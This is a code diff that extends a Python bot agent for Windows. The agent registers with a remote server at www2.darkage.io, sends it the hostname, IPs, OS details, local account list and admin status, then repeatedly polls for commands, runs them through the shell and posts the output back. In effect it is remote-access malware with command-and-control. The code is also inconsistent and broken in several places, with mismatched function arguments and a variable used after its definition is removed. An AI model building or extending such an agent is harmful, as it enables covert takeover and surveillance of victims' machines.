@@ -20,6 +20,13 @@ TODO: for third-party modules, it should request them
 from the server, and drop the wheel to disk, and then import.
 """
 
+"""
+Endpoints to implement:
+/register : POST JSON of device_metadata ; return token
+
+
+"""
+
 SERVER_URL = "http://www2.darkage.io:48172"
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
 CHECK_INTERVAL = 30
@@ -28,9 +35,13 @@ def main():
     if not LOCKFILE.exists():
         # Register for first time
         bot_token = register_bot()
-        LOCKFILE.touch()
+        if bot_token:
+            LOCKFILE.touch()
+            LOCKFILE.write_text(bot_token, encoding="utf-8")
+        else:
+            exit(1)
     
-    check_for_actions_loop()
+    check_for_actions_loop(LOCKFILE.read_text(encoding="utf-8"))
 
 def register_bot():
     """
@@ -39,7 +50,15 @@ def register_bot():
     """
     metadata = get_device_metadata()
     metadata["version"] = "0.1"
-    response = requests.post(SERVER_URL, json=metadata)
+
+    endpoint = "/register"
+    full_url = SERVER_URL + endpoint
+
+    response = requests.post(full_url, json=metadata)
+    if response:
+        return response.json.get('token')
+    else:
+        return None
 
 def get_device_metadata():
     """
@@ -54,16 +73,16 @@ def get_device_metadata():
 
     uname = platform.uname()
     winver = platform.win32_ver()
-    routing = subprocess.run(["route", "print"], capture_output=True, text=True, check=True)
     routing_out = routing.stdout
     local_accts = get_local_user_accounts()
+    is_local_admin = get_local_admin_status()
 
     return {
         "hostname": hostname,
         "ip_list": filtered_ips,
         "os_info": str(uname)+str(winver),
-        "routing": routing_out,
-        "accounts": local_accts
+        "accounts": local_accts,
+        "is_local_admin": is_local_admin
     }
 
 def get_local_user_accounts():
@@ -95,6 +114,105 @@ def get_local_user_accounts():
         users["local_accounts"] = [f"Failed to run 'net user': {e}"]
 
     return users
+
+def get_local_admin_status():
+    """
+        Returns true if the current process is running under a local admin,
+        False otherwise.
+    """
+    result = subprocess.run(
+        ["whoami", "/groups"],
+        capture_output=True,
+        text=True,
+        shell=True
+    )
+    return "S-1-5-32-544" in result.stdout
+
+def check_for_actions_loop(bot_token):
+    """
+        See if the bot needs to do anything.
+    """
+    while True:
+        info = get_info_from_api(bot_token)
+
+        cmd = info.get('command')
+        upload = info.get('upload')
+
+        if cmd:
+            output_dict = execute_command(bot_token, cmd)
+            post_cmd_output(output_dict)
+
+        if upload:
+            content = get_content(upload)
+            post_content(url, content)
+
+        sleep(CHECK_INTERVAL)
+
+def get_info_from_api(bot_token):
+    """
+        Get any relevant information from the bot API.
+    """
+    endpoint = "/info"
+    full_url = SERVER_URL + endpoint
+    headers = {
+        "X-API-TOKEN": bot_token
+    }
+
+    response = requests.get(full_url, headers=headers)
+    if response:
+        return response.json()
+
+def execute_command(cmd):
+    """
+        cmd_id : guid of cmd from server
+        cmd_str : cmd_str to execute
+    """
+    cmd_str = cmd.get('cmd_str')
+    cmd_id  = cmd.get('cmd_id')
+
+    output = subprocess.check_output(
+        cmd_str,
+        shell=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True
+    )
+
+    # remove trailing newline if any
+    return {
+        'cmd_id': cmd_id,
+        'output': output.stdout
+    }
+
+def get_content(upload):
+    """
+        upload_id : GUID of upload from server
+        upload_str : 
+    """
+    pass
+
+def post_cmd_output(bot_token, output_dict):
+    """
+        Post requested output to discord server.
+    """
+    endpoint = "/status"
+    full_url = SERVER_URL + endpoint
+
+    headers = {
+        "X-API-TOKEN": bot_token
+    }
+
+    response = requests.post(full_url, headers=headers, data=output_dict)
+    if response:
+        return response.status_code
+    else:
+        return None
+   
+def post_content(url, content):
+    """
+        Post requested content to discord server.
+    """
+    pass
 
 if __name__ == "__main__":
     main()
